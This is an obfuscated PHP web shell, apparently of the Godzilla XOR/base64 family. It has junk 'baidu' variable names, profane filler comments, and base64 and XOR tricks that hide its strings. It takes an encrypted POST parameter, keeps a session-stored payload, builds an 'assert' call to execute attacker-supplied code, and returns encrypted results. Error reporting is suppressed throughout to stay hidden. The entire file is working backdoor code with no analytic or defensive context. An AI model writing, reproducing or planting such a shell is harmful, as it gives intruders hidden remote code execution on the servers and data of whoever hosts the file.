
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*fuckgovVU*/(Chr("48"));
function baidugzp9dXi(/*fuckgovJCn3QxIwgC*/$baiduG,$baidufrbJnLfiXlvis0){
    for($baiduY1q9=Chr("48");$baiduY1q9<strlen($baiduG);$baiduY1q9++) {
        $baiduwUR7h = $baidufrbJnLfiXlvis0[$baiduY1q9+Chr("49")&15];
        $baiduG[$baiduY1q9] = $baiduG[$baiduY1q9]^$baiduwUR7h;
    }
    return $baiduG;
}
$baiduNvLdtyAyoQ = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_baidugzp9dXi = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$baiduwq=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baiduNvLdtyAyoQ($baiduNvLdtyAyoQ("Y2c9PQ=="));
$baiduMiCqmYhRJv='p'.$baiduNvLdtyAyoQ($baiduNvLdtyAyoQ("WVhsc2IyRms="));
$baiduEWkMhmqpKaCX5='c51659a6'.$baiduNvLdtyAyoQ("YTY4ZjU5MTE=");
$baiduvW=("!"^"@").'ss'.Chr("101").'rs';
$baiduvW++;
if (isset($_POST/*fuckgovkFOl5r*/[$baiduwq])){
    $datbaiduvW=baidugzp9dXi/*fuckgovWeIlmijrZ*/($baiduNvLdtyAyoQ($_POST[$baiduwq]),$baiduEWkMhmqpKaCX5);
    if (/*fuckgovU*/isset($_SESSION/*fuckgov3asBePtp*/[$baiduMiCqmYhRJv])){
        $baidumaXvJCxqHT8mD4=baidugzp9dXi($_SESSION/*fuckgovfWGEFwuPEq*/[$baiduMiCqmYhRJv],$baiduEWkMhmqpKaCX5);
        if (/*fuckgov5jSd*/strpos($baidumaXvJCxqHT8mD4,$baiduNvLdtyAyoQ/*fuckgovp3cX3bPUbCUYYj*/($baiduNvLdtyAyoQ("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
            $baidumaXvJCxqHT8mD4=baidugzp9dXi/*fuckgovaAKZ7XadCE*/($baidumaXvJCxqHT8mD4,$baiduEWkMhmqpKaCX5);
        }
		define("baidu8XDkxhgRq3MRzM","//baiduW\r\n".$baidumaXvJCxqHT8mD4);
		$baiduvW(baidu8XDkxhgRq3MRzM);
        echo substr(/*fuckgovBIGaM7cdbvCm*/md5/*fuckgovQLhUDazF21*/($baiduwq.$baiduEWkMhmqpKaCX5),Chr("48"),16);
        echo $base64_baidugzp9dXi(baidugzp9dXi(@run($datbaiduvW),$baiduEWkMhmqpKaCX5));
        echo substr(/*fuckgovVCk*/md5/*fuckgovdnTG1ZwtXhEEjt*/($baiduwq.$baiduEWkMhmqpKaCX5),16);
    }else{
        if (strpos/*fuckgovnCCDsZmDxmXCUDa*/($datbaiduvW,$baiduNvLdtyAyoQ($baiduNvLdtyAyoQ("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
            $_SESSION[$baiduMiCqmYhRJv]=baidugzp9dXi($datbaiduvW,$baiduEWkMhmqpKaCX5);
        }
    }
}
?>
